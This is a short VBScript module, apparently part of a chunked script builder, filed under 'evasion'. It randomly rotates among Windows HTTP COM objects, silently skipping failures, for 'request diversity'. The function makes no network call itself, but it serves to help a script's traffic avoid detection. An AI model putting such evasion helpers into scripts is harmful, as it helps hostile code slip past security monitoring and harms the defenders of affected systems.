' chunk: evasion/http_object_rotate
' depends: (none)
' provides: create_http
' format: vbscript
' note: Rotate HTTP COM object for request diversity

Function create_http()
    On Error Resume Next
    Dim obj, progIds, i
    progIds = Array("WinHttp.WinHttpRequest.5.1", _
                    "MSXML2.ServerXMLHTTP.6.0", _
                    "MSXML2.ServerXMLHTTP", _
                    "MSXML2.XMLHTTP.6.0", _
                    "MSXML2.XMLHTTP")
    Randomize
    Dim start
    start = Int(Rnd * 5)
    For i = 0 To 4
        Dim idx
        idx = (start + i) Mod 5
        Set obj = CreateObject(progIds(idx))
        If Err.Number = 0 Then
            Set create_http = obj
            Exit Function
        End If
        Err.Clear
    Next
    Set create_http = Nothing
End Function
